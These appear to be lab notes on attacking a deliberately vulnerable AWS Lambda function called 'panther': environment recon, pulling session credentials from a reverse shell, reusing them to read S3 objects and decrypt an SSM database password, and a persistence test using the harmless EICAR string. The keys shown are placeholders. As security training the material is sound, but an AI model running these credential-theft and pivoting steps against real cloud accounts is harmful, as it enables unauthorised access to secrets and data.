# AWS Lambda

## Execution Environment

```
id
uid=496(sbx_user1051) gid=495 groups=495
```

```
whoami
sbx_user1051
```

```
pwd
/var/task
```

```
ls -la
total 236
...
drwxrwxr-x  2 root root     34 Jan  6 16:16 assets
-rw-r--r--  1 root root    221 Jan  1  1980 config.json
drwxrwxr-x  2 root root     31 Jan  6 16:16 docs
-rw-r--r--  1 root root    314 Jan  1  1980 .eslintrc.json
-rw-r--r--  1 root root   1618 Jan  1  1980 handler.js
drwxrwxr-x  3 root root     27 Jan  6 16:16 node_modules
-rw-r--r--  1 root root   1101 Jan  1  1980 package.json
-rw-r--r--  1 root root   2888 Jan  1  1980 README.md
```

```
cat config.json
{
    "dev": {
        "database": {
            "user": "panther_user",
            "pass": "RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9u4oCZdCBrbm93IGV2aWwgb3IgamVhbG91c3kgb3IgZGlzY29udGVudC4="
        }
    }
}
```

```
ls /
bin
boot
cloudsql
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
serve
srv
start
sys
tmp
usr
var
```

```
cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
VARIANT_ID="201910291416-al2.210.0"
```

```
echo "test" > test.txt
/bin/sh: line 7: test.txt: Read-only file system
```

```
env
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=ABC123
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LAMBDA_TASK_ROOT=/var/task
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/panther-dev-panther
AWS_LAMBDA_LOG_STREAM_NAME=2020/01/05/[$LATEST]786a619211474ab1abe53a27eb390c0a
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_EXECUTION_ENV=AWS_Lambda_nodejs12.x
AWS_LAMBDA_FUNCTION_NAME=panther-dev-panther
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=abc123
LANG=en_US.UTF-8
LAMBDA_RUNTIME_DIR=/var/runtime
TZ=:UTC
AWS_REGION=us-east-1
NODE_PATH=/opt/nodejs/node12/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules
AWS_ACCESS_KEY_ID=abc123
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
_X_AMZN_TRACE_ID=Root=1-5e126873-5371714038dfaa8cb41e3de0;Parent=74f98cb5549ebe41;Sampled=0
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=handler.panther
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1024
_=/usr/bin/env
```

## Token Pivoting

### Retrieving Access Keys

Within a Panther reverse shell session:

```bash
env | grep ACCESS
env | grep AWS_SESSION_TOKEN
```

### Accessing Private Resources

On your local machine, export the environment variables retrieved in the previous step:

```bash
export AWS_ACCESS_KEY_ID=<ENTER KEY ID>
export AWS_SECRET_ACCESS_KEY=<ENTER SECRET ACCESS KEY>
export AWS_SESSION_TOKEN=<ENTER SESSION TOKEN>
```

Run the following commands:

```bash
aws s3 cp s3://panther-$BUCKET_SUFFIX/assets/panther.jpg .
aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1
```

Running the following `watch` command to test how long the keys are valid for:

```bash
while true; do aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1; date; sleep 3600; done
```

Expiration does not appear to occur until 12 hours after extracting the token.

## Persistence

Persisting a malware payload into the runtime environment:

```
echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```
Waiting approximately 3 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

After approximately 15 minutes, still there:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 11 minutes of inactivity:

```
cat /tmp/malware.sh
cat: /tmp/malware.sh: No such file or directory
```
